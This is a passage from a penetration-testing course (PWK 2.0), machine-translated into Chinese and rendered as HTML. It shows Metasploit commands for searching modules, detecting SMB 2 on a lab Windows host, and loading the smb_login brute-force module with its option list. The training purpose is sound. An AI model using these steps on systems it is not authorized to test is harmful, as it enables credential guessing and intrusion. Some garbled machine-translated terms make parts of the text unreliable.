<div style="position:absolute;top:78813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关键词：</font></font></nobr></div>
<div style="position:absolute;top:78830;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">又名    </font></font></nobr></div>
<div style="position:absolute;top:78830;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：具有匹配 AKA（也称为）名称的模块</font></font></nobr></div>
<div style="position:absolute;top:78847;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">author : 该作者编写的模块</font></font></nobr></div>
<div style="position:absolute;top:78864;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">拱    </font></font></nobr></div>
<div style="position:absolute;top:78864;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：影响此架构的模块</font></font></nobr></div>
<div style="position:absolute;top:78881;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出价    </font></font></nobr></div>
<div style="position:absolute;top:78881;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：具有匹配 Bugtraq ID 的模块</font></font></nobr></div>
<div style="position:absolute;top:78898;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">静脉曲张    </font></font></nobr></div>
<div style="position:absolute;top:78898;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：具有匹配 CVE ID 的模块</font></font></nobr></div>
<div style="position:absolute;top:78915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:78932;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">target : 影响这个目标的模块</font></font></nobr></div>
<div style="position:absolute;top:78949;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型    </font></font></nobr></div>
<div style="position:absolute;top:78949;left:222"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：特定类型的模块（漏洞利用、有效载荷、辅助、编码器、eva</font></font></nobr></div>
<div style="position:absolute;top:78983;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例子：</font></font></nobr></div>
<div style="position:absolute;top:79000;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索 cve:2009 类型：exploit</font></font></nobr></div>
<div style="position:absolute;top:79034;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">搜索类型：辅助名称：smb</font></font></font></b></nobr></div>
<div style="position:absolute;top:79068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">匹配模块</font></font></nobr></div>
<div style="position:absolute;top:79085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================</font></font></nobr></div>
<div style="position:absolute;top:79119;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:79119;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等级说明</font></font></nobr></div>
<div style="position:absolute;top:79136;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:79136;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- ------------</font></font></nobr></div>
<div style="position:absolute;top:79153;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">辅助/admin/oracle/ora_ntlm_stealer 正常 Oracle SMB Relay 代码执行</font></font></nobr></div>
<div style="position:absolute;top:79170;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">辅助/管理员/smb/check_dir_file    </font></font></nobr></div>
<div style="position:absolute;top:79170;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">普通 SMB 扫描程序检查文件/目录</font></font></nobr></div>
<div style="position:absolute;top:79187;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">辅助/管理员/smb/delete_file    </font></font></nobr></div>
<div style="position:absolute;top:79187;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">普通 SMB 文件删除实用程序</font></font></nobr></div>
<div style="position:absolute;top:79204;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">辅助/管理员/smb/download_file    </font></font></nobr></div>
<div style="position:absolute;top:79204;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">普通 SMB 文件下载实用程序</font></font></nobr></div>
<div style="position:absolute;top:79221;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:79240;left:317"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 746 - 搜索 SMB 辅助模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79270;left:109"><nobr><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 use</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调用模块后</font><font style="vertical-align: inherit;">，我们可以请求</font><font style="vertical-align: inherit;">有关它的</font><font style="vertical-align: inherit;">更多</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，如下所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:79304;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用扫描仪/smb/smb2</font></font></font></b></nobr></div>
<div style="position:absolute;top:79338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb2）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></font></b></nobr></div>
<div style="position:absolute;top:79372;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称：SMB 2.0 协议检测</font></font></nobr></div>
<div style="position:absolute;top:79389;left:149"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块：辅助/扫描仪/smb/smb2</font></font></nobr></div>
<div style="position:absolute;top:79406;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">许可证：Metasploit 框架许可证 (BSD)</font></font></nobr></div>
<div style="position:absolute;top:79423;left:166"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">等级：普通</font></font></nobr></div>
<div style="position:absolute;top:79457;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由...提供：</font></font></nobr></div>
<div style="position:absolute;top:79474;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hdm &lt;x@hdm.io&gt;</font></font></nobr></div>
<div style="position:absolute;top:79508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查支持：</font></font></nobr></div>
<div style="position:absolute;top:79525;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是的</font></font></nobr></div>
<div style="position:absolute;top:79559;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本选项：</font></font></nobr></div>
<div style="position:absolute;top:79576;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称 当前设置 必需 描述</font></font></nobr></div>
<div style="position:absolute;top:79593;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- --------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:79610;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机    </font></font></nobr></div>
<div style="position:absolute;top:79610;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 目标地址范围或 CIDR 标识符</font></font></nobr></div>
<div style="position:absolute;top:79627;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">报告 445    </font></font></nobr></div>
<div style="position:absolute;top:79627;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 目标端口 (TCP)</font></font></nobr></div>
<div style="position:absolute;top:79644;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">线程 1    </font></font></nobr></div>
<div style="position:absolute;top:79644;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是并发线程数 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:79771;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="68"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 68 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:79804;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:80881;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:80881;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:80881;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">685</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:79916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">描述：</font></font></nobr></div>
<div style="position:absolute;top:79933;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测支持 SMB 2.0 协议的系统</font></font></nobr></div>
<div style="position:absolute;top:79953;left:300"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 747 - 显示有关 SMB 模块的信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:79982;left:109"><nobr><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">info</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出的模块描述</font><font style="vertical-align: inherit;">告诉我们 smb2 模块的目的是检测</font></font></nobr></div>
<div style="position:absolute;top:80002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程机器是否支持 SMB 2.0 协议。</font><font style="vertical-align: inherit;">模块的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">基本选项</font></font></i></nobr></div>
<div style="position:absolute;top:80021;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过执行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">show options</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">来检查参数</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">对于这个特殊</font></font></nobr></div>
<div style="position:absolute;top:80041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块，我们只需要</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目标的 IP 地址，在这种情况下我们的学生 Windows 10</font></font></nobr></div>
<div style="position:absolute;top:80060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机器。</font></font></nobr></div>
<div style="position:absolute;top:80092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或者，由于我们已经扫描了我们的 Windows 10 机器，我们可以搜索</font></font></nobr></div>
<div style="position:absolute;top:80112;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TCP 端口 445 打开的主机的 Metasploit 数据库（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">services -p 445</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）并自动添加</font></font></nobr></div>
<div style="position:absolute;top:80131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结果到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOSTS</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">–rhosts</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ):</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:80166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_version）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务 -p 445 --rhosts</font></font></font></b></nobr></div>
<div style="position:absolute;top:80200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务</font></font></nobr></div>
<div style="position:absolute;top:80217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">========</font></font></nobr></div>
<div style="position:absolute;top:80251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主持人    </font></font></nobr></div>
<div style="position:absolute;top:80251;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口原型名称    </font></font></nobr></div>
<div style="position:absolute;top:80251;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态信息</font></font></nobr></div>
<div style="position:absolute;top:80268;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:80268;left:247"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- ----- ----    </font></font></nobr></div>
<div style="position:absolute;top:80268;left:465"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----- ----</font></font></nobr></div>
<div style="position:absolute;top:80285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22 445 tcp microsoft-ds 打开 ()</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:80319;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RHOSTS =&gt; 10.11.0.22</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:80353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_version）&gt; </font></font></nobr></div>
<div style="position:absolute;top:80372;left:306"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 748 - 从数据库加载 IP 地址</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:80402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">配置所需的参数后，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">run</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">exploit</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动模块</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:80437;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb2）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行</font></font></font></b></nobr></div>
<div style="position:absolute;top:80470;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 10.11.0.22:445 - 10.11.0.22 支持 SMB 2 [方言 255.2] 已​​上线 f</font></font></nobr></div>
<div style="position:absolute;top:80487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 扫描了 1 个主机中的 1 个（100% 完成）</font></font></nobr></div>
<div style="position:absolute;top:80505;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 辅助模块执行完成</font></font></nobr></div>
<div style="position:absolute;top:80524;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 749 - 运行辅助模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:80553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据模块的输出，远程计算机确实支持 SMB 版本 2。</font></font></nobr></div>
<div style="position:absolute;top:80573;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用这一点，我们可以使用scanner/smb/smb_login 模块来尝试暴力登录</font></font></nobr></div>
<div style="position:absolute;top:80592;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">反对机器。</font><font style="vertical-align: inherit;">加载模块并列出选项会产生以下输出：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:80627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_enumusers_domain）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用扫描仪/smb/smb_login</font></font></font></b></nobr></div>
<div style="position:absolute;top:80661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 辅助（扫描仪/smb/smb_login）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font></font></font></b></nobr></div>
<div style="position:absolute;top:80695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">模块选项（辅助/扫描仪/smb/smb_login）：</font></font></nobr></div>
<div style="position:absolute;top:80729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">名称    </font></font></nobr></div>
<div style="position:absolute;top:80729;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前设置 需要 说明</font></font></nobr></div>
<div style="position:absolute;top:80746;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----    </font></font></nobr></div>
<div style="position:absolute;top:80746;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--------------- -------- -----------</font></font></nobr></div>
<div style="position:absolute;top:80762;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ABORT_ON_LOCKOUT 假    </font></font></nobr></div>
<div style="position:absolute;top:80762;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 帐户锁定时中止运行</font></font></nobr></div>
<div style="position:absolute;top:80780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BLANK_PASSWORDS 假    </font></font></nobr></div>
<div style="position:absolute;top:80780;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:80780;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为所有用户尝试空密码</font></font></nobr></div>
<div style="position:absolute;top:80797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">蛮力_速度 5    </font></font></nobr></div>
<div style="position:absolute;top:80797;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 暴力破解的速度，从 0 到 5</font></font></nobr></div>
<div style="position:absolute;top:80814;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DB_ALL_CREDS 假    </font></font></nobr></div>
<div style="position:absolute;top:80814;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:80814;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试存储在每个用户/密码对 </font></font></nobr></div>
<div style="position:absolute;top:80830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DB_ALL_PASS    </font></font></nobr></div>
<div style="position:absolute;top:80830;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">错误的    </font></font></nobr></div>
<div style="position:absolute;top:80830;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:80830;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加当前数据库中的所有密码 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:80959;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="69"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 69 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:80992;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:82069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:82069;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:82069;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">686</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:81088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DB_ALL_USERS 假    </font></font></nobr></div>
<div style="position:absolute;top:81088;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81088;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将当前数据库中的所有用户添加到</font></font></nobr></div>
<div style="position:absolute;top:81104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DETECT_ANY_AUTH 假    </font></font></nobr></div>
<div style="position:absolute;top:81104;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81104;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用检测系统接受一个</font></font></nobr></div>
<div style="position:absolute;top:81121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">DETECT_ANY_DOMAIN 假    </font></font></nobr></div>
<div style="position:absolute;top:81121;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81121;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测spe是否需要域</font></font></nobr></div>
<div style="position:absolute;top:81138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码文件    </font></font></nobr></div>
<div style="position:absolute;top:81138;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81138;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含密码的文件，每行一个</font></font></nobr></div>
<div style="position:absolute;top:81156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PRESERVE_DOMAINS 真    </font></font></nobr></div>
<div style="position:absolute;top:81156;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81156;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尊重包含域名的用户名</font></font></nobr></div>
<div style="position:absolute;top:81172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理    </font></font></nobr></div>
<div style="position:absolute;top:81172;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81172;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">格式类型的代理链：host:port[,</font></font></nobr></div>
<div style="position:absolute;top:81189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">RECORD_GUEST 假    </font></font></nobr></div>
<div style="position:absolute;top:81189;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81189;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">记录来宾特权的随机登录到</font></font></nobr></div>
<div style="position:absolute;top:81206;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机    </font></font></nobr></div>
<div style="position:absolute;top:81206;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 目标地址范围或 CIDR 标识</font></font></nobr></div>
<div style="position:absolute;top:81223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">端口    </font></font></nobr></div>
<div style="position:absolute;top:81223;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">445    </font></font></nobr></div>
<div style="position:absolute;top:81223;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 SMB 服务端口 (TCP)</font></font></nobr></div>
<div style="position:absolute;top:81240;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMB域    </font></font></nobr></div>
<div style="position:absolute;top:81240;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.    </font></font></nobr></div>
<div style="position:absolute;top:81240;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81240;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用于身份验证的 Windows 域</font></font></nobr></div>
<div style="position:absolute;top:81257;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SMB通行证    </font></font></nobr></div>
<div style="position:absolute;top:81257;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81257;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指定用户名的密码</font></font></nobr></div>
<div style="position:absolute;top:81274;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中小企业用户    </font></font></nobr></div>
<div style="position:absolute;top:81274;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81274;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要进行身份验证的用户名</font></font></nobr></div>
<div style="position:absolute;top:81291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">STOP_ON_SUCCESS 假    </font></font></nobr></div>
<div style="position:absolute;top:81291;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 当凭证有效时停止猜测</font></font></nobr></div>
<div style="position:absolute;top:81308;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">线程    </font></font></nobr></div>
<div style="position:absolute;top:81308;left:263"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1    </font></font></nobr></div>
<div style="position:absolute;top:81308;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是 并发线程数</font></font></nobr></div>
<div style="position:absolute;top:81325;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USERPASS_FILE    </font></font></nobr></div>
<div style="position:absolute;top:81325;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81325;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含用户和密码 sepa 的文件</font></font></nobr></div>
<div style="position:absolute;top:81342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">USER_AS_PASS 假    </font></font></nobr></div>
<div style="position:absolute;top:81342;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81342;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试将用户名作为所有人的密码</font></font></nobr></div>
<div style="position:absolute;top:81359;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户文件    </font></font></nobr></div>
<div style="position:absolute;top:81359;left:400"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不    </font></font></nobr></div>
<div style="position:absolute;top:81359;left:481"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包含用户名的文件，每行一个</font></font></nobr></div>
<div style="position:absolute;top:81376;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">详细    </font></font></nobr></div>
